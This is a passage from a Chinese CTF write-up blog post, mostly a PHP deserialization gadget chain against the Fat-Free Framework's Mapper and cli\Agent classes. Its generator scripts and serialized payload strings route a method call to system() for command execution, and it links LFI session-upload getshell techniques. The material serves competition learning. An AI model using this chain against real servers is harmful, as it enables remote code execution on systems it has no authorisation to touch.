<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$func,$args</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> call_user_func_array(</span><br><span class="line">		(array_key_exists($func,<span class="keyword">$this</span>-&gt;props)?   <span class="comment">//检查数组里是否有指定的键名或索引</span></span><br><span class="line">			<span class="keyword">$this</span>-&gt;props[$func]:</span><br><span class="line">			<span class="keyword">$this</span>-&gt;$func),$args</span><br><span class="line">	);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">find</span>(<span class="params">$filter=<span class="literal">NULL</span>,<span class="keyword">array</span> $options=<span class="literal">NULL</span>,$ttl=<span class="number">0</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!$options)</span><br><span class="line">		$options=[];</span><br><span class="line">	$options+=[</span><br><span class="line">		<span class="string">&#x27;group&#x27;</span>=&gt;<span class="literal">NULL</span>,</span><br><span class="line">		<span class="string">&#x27;order&#x27;</span>=&gt;<span class="literal">NULL</span>,</span><br><span class="line">		<span class="string">&#x27;limit&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&#x27;offset&#x27;</span>=&gt;<span class="number">0</span></span><br><span class="line">	];</span><br><span class="line">	$adhoc=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;adhoc <span class="keyword">as</span> $key=&gt;$field)</span><br><span class="line">		$adhoc.=<span class="string">&#x27;,&#x27;</span>.$field[<span class="string">&#x27;expr&#x27;</span>].<span class="string">&#x27; AS &#x27;</span>.<span class="keyword">$this</span>-&gt;db-&gt;quotekey($key);</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;select(</span><br><span class="line">		($options[<span class="string">&#x27;group&#x27;</span>] &amp;&amp; !preg_match(<span class="string">&#x27;/mysql|sqlite/&#x27;</span>,<span class="keyword">$this</span>-&gt;engine)?</span><br><span class="line">			$options[<span class="string">&#x27;group&#x27;</span>]:</span><br><span class="line">			implode(<span class="string">&#x27;,&#x27;</span>,array_map([<span class="keyword">$this</span>-&gt;db,<span class="string">&#x27;quotekey&#x27;</span>],</span><br><span class="line">				array_keys(<span class="keyword">$this</span>-&gt;fields)))).$adhoc,$filter,$options,$ttl);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此外,将<code>$this-&gt;db = $this</code>,</p>
<p>上面代码可以简化为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $AA;</span><br><span class="line">    <span class="keyword">public</span> $num = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> $cmd = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $props;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;AA=<span class="keyword">$this</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;props = <span class="keyword">array</span>(<span class="string">&quot;kali&quot;</span>=&gt;<span class="string">&quot;system&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$func,$args</span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> call_user_func_array(</span><br><span class="line">			(array_key_exists($func,<span class="keyword">$this</span>-&gt;props)?   <span class="comment">//检查数组里是否有指定的键名或索引</span></span><br><span class="line">				<span class="keyword">$this</span>-&gt;props[$func]:</span><br><span class="line">				<span class="keyword">$this</span>-&gt;$func),$args</span><br><span class="line">		);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">find</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;AA-&gt;kali(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$aa = <span class="keyword">new</span> A();</span><br><span class="line">$aa-&gt;find();</span><br><span class="line"><span class="comment"># 注意传参就传了一个</span></span><br></pre></td></tr></table></figure>

<p><img src="http://img.xzaslxr.xyz/img/image-20200803062207187.png" alt="image-20200803062207187"></p>
<p>故此,payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>\<span class="title">SQL</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mapper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $props;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;adhoc=[<span class="string">&#x27;ls&#x27;</span>=&gt;[<span class="string">&quot;xz&quot;</span>=&gt;<span class="string">&quot;fe10&quot;</span>]];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;fields=[];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;props = [<span class="string">&#x27;quotekey&#x27;</span> =&gt; <span class="string">&quot;system&quot;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">cli</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">DB</span>\<span class="title">SQL</span>\<span class="title">Mapper</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Agent</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;server = <span class="keyword">$this</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;events = [<span class="string">&quot;disconnect&quot;</span> =&gt; <span class="keyword">new</span> Mapper()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">cli</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WS</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">new</span> Agent();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> (serialize(<span class="keyword">new</span> WS()));</span><br><span class="line"><span class="comment">#O:6:&quot;cli\WS&quot;:1:&#123;s:4:&quot;test&quot;;O:9:&quot;cli\Agent&quot;:2:&#123;s:6:&quot;server&quot;;r:2;s:6:&quot;events&quot;;a:1:&#123;s:10:&quot;disconnect&quot;;O:13:&quot;DB\SQL\Mapper&quot;:4:&#123;s:5:&quot;props&quot;;a:1:&#123;s:8:&quot;quotekey&quot;;s:6:&quot;system&quot;;&#125;s:5:&quot;adhoc&quot;;a:1:&#123;s:2:&quot;ls&quot;;a:1:&#123;s:2:&quot;xz&quot;;s:5:&quot;fe1w0&quot;;&#125;&#125;s:6:&quot;fields&quot;;a:0:&#123;&#125;s:2:&quot;db&quot;;r:5;&#125;&#125;&#125;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>但这样会导致<code>isset($this-&gt;server-&gt;events[&#39;disconnect&#39;]) &amp;&amp; is_callable($func=$this-&gt;server-&gt;events[&#39;disconnect&#39;])</code> 为<code>false</code></p>
<p>需要<code>$this-&gt;events = [&quot;disconnect&quot; =&gt; new Mapper()];</code> 改为<code>*$**this*-&gt;events = [&quot;disconnect&quot; =&gt; [new Mapper()],&#39;find&#39;];</code></p>
<p>为什么要写<code>find</code>以及在后面</p>
<p>写的原因</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_callable([<span class="keyword">new</span> A(),<span class="string">&quot;find&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;true&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_callable([<span class="string">&quot;find&quot;</span>,<span class="keyword">new</span> A()]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;true&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_callable([<span class="keyword">new</span> A()]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;true&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_callable(<span class="keyword">new</span> A()))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;true&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#或</span></span><br><span class="line"><span class="keyword">echo</span> serialize([<span class="keyword">new</span> A(),<span class="string">&quot;find&quot;</span>]).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize([<span class="string">&quot;find&quot;</span>,<span class="keyword">new</span> A()]).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize([<span class="keyword">new</span> A()]).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> A()).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">a:2:&#123;i:0;O:1:&quot;A&quot;:4:&#123;s:2:&quot;AA&quot;;r:2;s:3:&quot;num&quot;;i:1;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;s:5:&quot;props&quot;;a:1:&#123;s:4:&quot;kali&quot;;s:6:&quot;system&quot;;&#125;&#125;i:1;s:4:&quot;find&quot;;&#125;</span></span><br><span class="line"><span class="comment">a:2:&#123;i:0;s:4:&quot;find&quot;;i:1;O:1:&quot;A&quot;:4:&#123;s:2:&quot;AA&quot;;r:3;s:3:&quot;num&quot;;i:1;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;s:5:&quot;props&quot;;a:1:&#123;s:4:&quot;kali&quot;;s:6:&quot;system&quot;;&#125;&#125;&#125;</span></span><br><span class="line"><span class="comment">a:1:&#123;i:0;O:1:&quot;A&quot;:4:&#123;s:2:&quot;AA&quot;;r:2;s:3:&quot;num&quot;;i:1;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;s:5:&quot;props&quot;;a:1:&#123;s:4:&quot;kali&quot;;s:6:&quot;system&quot;;&#125;&#125;&#125;</span></span><br><span class="line"><span class="comment">O:1:&quot;A&quot;:4:&#123;s:2:&quot;AA&quot;;r:1;s:3:&quot;num&quot;;i:1;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;s:5:&quot;props&quot;;a:1:&#123;s:4:&quot;kali&quot;;s:6:&quot;system&quot;;&#125;&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>这四个if中,只有第一个是正确的,感觉这个跟执行顺序有关</p>
</blockquote>
<p>以正确的payload为例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;cli\WS&quot;:1:&#123;s:4:&quot;test&quot;;O:9:&quot;cli\Agent&quot;:2:&#123;s:6:&quot;server&quot;;r:2;s:6:&quot;events&quot;;a:2:&#123;s:10:&quot;disconnect&quot;;a:1:&#123;i:0;O:13:&quot;DB\SQL\Mapper&quot;:4:&#123;s:5:&quot;props&quot;;a:1:&#123;s:8:&quot;quotekey&quot;;s:6:&quot;system&quot;;&#125;s:5:&quot;adhoc&quot;;a:1:&#123;s:2:&quot;ls&quot;;a:1:&#123;s:2:&quot;xz&quot;;s:5:&quot;fe1w0&quot;;&#125;&#125;s:6:&quot;fields&quot;;a:0:&#123;&#125;s:2:&quot;db&quot;;r:6;&#125;&#125;i:0;s:4:&quot;find&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><code>db</code> 的<code>r:&lt;number&gt;</code>为6,同时<code>db</code>还指向自己一次,即多加了一层,<code>&#125;&#125;</code> 回退两次后,到达的层为<code>\DB\Cursor</code>,而在<code>\DB\Cursor</code>的方法中只有<code>find </code>函数符合要求</p>
<blockquote>
<p><code>\DB\Cursor</code> 原因 <code>class Mapper *extends* \DB\Cursor</code></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*	Return records (array of mapper objects) that match criteria</span></span><br><span class="line"><span class="comment">*	<span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">*	<span class="doctag">@param</span> $filter string|array</span></span><br><span class="line"><span class="comment">*	<span class="doctag">@param</span> $options array</span></span><br><span class="line"><span class="comment">*	<span class="doctag">@param</span> $ttl int</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="function"><span class="keyword">function</span> <span class="title">find</span>(<span class="params">$filter=<span class="literal">NULL</span>,<span class="keyword">array</span> $options=<span class="literal">NULL</span>,$ttl=<span class="number">0</span></span>)</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>正确的payload</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>\<span class="title">SQL</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mapper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $props;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;adhoc=[<span class="string">&#x27;ls&#x27;</span>=&gt;[<span class="string">&quot;xz&quot;</span>=&gt;<span class="string">&quot;fe1w0&quot;</span>]];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;fields=[];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;props = [<span class="string">&#x27;quotekey&#x27;</span> =&gt; <span class="string">&quot;system&quot;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">cli</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">DB</span>\<span class="title">SQL</span>\<span class="title">Mapper</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Agent</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;server = <span class="keyword">$this</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;events = [<span class="string">&quot;disconnect&quot;</span> =&gt; [<span class="keyword">new</span> Mapper(),<span class="string">&quot;find&quot;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">cli</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WS</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">new</span> Agent();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> (serialize(<span class="keyword">new</span> WS()));</span><br></pre></td></tr></table></figure>

<h2 id="web-checkin2"><a href="#web-checkin2" class="headerlink" title="web_checkin2"></a><strong>web_checkin2</strong></h2><blockquote>
<p>这题好像坏了,一直打不开</p>
</blockquote>
<p>思路:</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/news/202819.html">利用session.upload_progress进行文件包含和反序列化渗透</a> </p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/201177#h3-6">LFI 绕过 Session 包含限制 Getshell</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/201136#h3-6">PHP LFI 利用临时文件 Getshell 姿势</a></p>
<p>但后面出题方放弃修这道题,无法正常访问。</p>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p><img src="http://img.xzaslxr.xyz/img/1231231231231.png" alt="1231231231231"></p>
<h2 id="web-6"><a href="#web-6" class="headerlink" title="web"></a>web</h2><h3 id="noclass"><a href="#noclass" class="headerlink" title="noclass"></a>noclass</h3><blockquote>
<p>很有意思一道题,靠🦌🥚弄的</p>
</blockquote>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">$f = <span class="keyword">new</span> <span class="built_in">stdClass</span>();</span><br><span class="line">$f-&gt;c = <span class="string">&quot;haha&quot;</span>;</span><br><span class="line">$f-&gt;d = &amp;$f-&gt;c;</span><br><span class="line"><span class="keyword">echo</span> serialize($f);</span><br><span class="line">$b = $f;</span><br><span class="line">$b-&gt;c = $flag;</span><br><span class="line"><span class="keyword">echo</span> serialize($b);</span><br><span class="line"><span class="keyword">foreach</span>($b <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span>($key===<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="安恒八月-暂时未复现"><a href="#安恒八月-暂时未复现" class="headerlink" title="安恒八月[暂时未复现]"></a>安恒八月[暂时未复现]</h1>
    </article>
    <!-- license  -->
    
        <div class="license-wrapper">
            <p>原文作者：<a href="https://fe1w0.github.io">fe1w0</a>
            <p>原文链接：<a href="https://fe1w0.github.io/2020/09/12/20208%E6%9C%88%E5%88%B09%E6%9C%88%E5%88%9D%E7%9A%84wp%E5%90%88%E9%9B%86/">https://fe1w0.github.io/2020/09/12/20208%E6%9C%88%E5%88%B09%E6%9C%88%E5%88%9D%E7%9A%84wp%E5%90%88%E9%9B%86/</a>
            <p>发表日期：<a href="https://fe1w0.github.io/2020/09/12/20208%E6%9C%88%E5%88%B09%E6%9C%88%E5%88%9D%E7%9A%84wp%E5%90%88%E9%9B%86/">September 12th 2020, 3:05:07 pm</a>
            <p>更新日期：<a href="https://fe1w0.github.io/2020/09/12/20208%E6%9C%88%E5%88%B09%E6%9C%88%E5%88%9D%E7%9A%84wp%E5%90%88%E9%9B%86/">March 15th 2021, 12:19:26 am</a>
            <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
        </div>
    
    <!-- paginator  -->
    <ul class="post-paginator">
        <li class="next">
            
                <div class="nextSlogan">Next Post</div>
                <a href= "/2020/09/13/PHP-Parser/" title= "初识PHP-Parser">
                    <div class="nextTitle">初识PHP-Parser</div>
                </a>
            
        </li>
        <li class="previous">
            
                <div class="prevSlogan">Previous Post</div>
                <a href= "/2020/07/26/CyBRICS-CTF-2020/" title= "CyBRICS CTF 2020">
                    <div class="prevTitle">CyBRICS CTF 2020</div>
                </a>
            
        </li>
    </ul>
    <!-- 评论插件 -->
    <!-- 来必力City版安装代码 -->

    <div id="lv-container" data-id="city" data-uid= MTAyMC80ODYzMS8yNTEyNQ==>
        <script type="text/javascript">
            (function (d, s) {
                var j, e = d.getElementsByTagName(s)[0];
                if (typeof LivereTower === 'function') { return; }
                j = d.createElement(s);
                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
                j.async = true;

                e.parentNode.insertBefore(j, e);
            })(document, 'script');
        </script>
        <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
    </div>

<!-- City版安装代码已完成 -->
    
    
    <!-- gitalk评论 -->

    <!-- utteranc评论 -->

    <!-- partial('_partial/comment/changyan') -->
    <!--PC版-->


    
    

    <!-- 评论 -->
</main>
            <!-- profile -->
            
        </div>
        <footer class="footer footer-unloaded">
    <!-- social  -->
    
    <div class="social">
        
    
        
            
                <a href="mailto:xzasliuxinrong@gmail.com" class="iconfont-archer email" title=email ></a>
            
        
    
        
            
                <a href="//github.com/xzlxr" class="iconfont-archer github" target="_blank" title=github></a>
            
        
    
        
            
                <span class="iconfont-archer wechat" title=wechat>
                  
                  <img class="profile-qr" src="/assets/example_qr.png" />
                </span>
            
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
            
                <a href="https://steamcommunity.com/id/xzlxr/" class="iconfont-archer steam" target="_blank" title=steam></a>
            
        
    
        
    
        
            
                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
            
        
    

    </div>
    
    <!-- powered by Hexo  -->
    <div class="copyright">
        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
    </div>
    <!-- 不蒜子  -->
    
    <div class="busuanzi-container">
    
     
    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
    
    </div>
    
</footer>
    </div>
    <!-- toc -->
    
    <div class="toc-wrapper" style=
    







top:50vh;

    >
        <div class="toc-catalog">
            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
        </div>
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E4%B8%89%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B"><span class="toc-number">1.</span> <span class="toc-text">第十三届全国大学生信息安全竞赛-创新实践能力赛</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fork"><span class="toc-number">1.1.1.</span> <span class="toc-text">fork</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rceme"><span class="toc-number">1.1.2.</span> <span class="toc-text">rceme</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#littlegame"><span class="toc-number">1.1.3.</span> <span class="toc-text">littlegame</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easytrick"><span class="toc-number">1.1.4.</span> <span class="toc-text">easytrick</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyunserialize"><span class="toc-number">1.1.5.</span> <span class="toc-text">babyunserialize</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%F0%9F%8E%A3%E6%9D%AF"><span class="toc-number">2.</span> <span class="toc-text">🎣杯</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-1"><span class="toc-number">2.1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#gamebox"><span class="toc-number">2.1.1.</span> <span class="toc-text">gamebox</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyseed"><span class="toc-number">2.1.2.</span> <span class="toc-text">easyseed</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyweb"><span class="toc-number">2.1.3.</span> <span class="toc-text">easyweb</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.2.</span> <span class="toc-text"></span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF"><span class="toc-number">3.</span> <span class="toc-text">第四届强网杯</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B"><span class="toc-number">3.1.</span> <span class="toc-text">强网先锋</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web%E8%BE%85%E5%8A%A9"><span class="toc-number">3.1.1.</span> <span class="toc-text">web辅助</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E5%8A%A8"><span class="toc-number">3.1.2.</span> <span class="toc-text">主动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Funhash"><span class="toc-number">3.1.3.</span> <span class="toc-text">Funhash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#upload"><span class="toc-number">3.1.4.</span> <span class="toc-text">upload</span></a></li></ol></li></ol></li><li class="toc-item 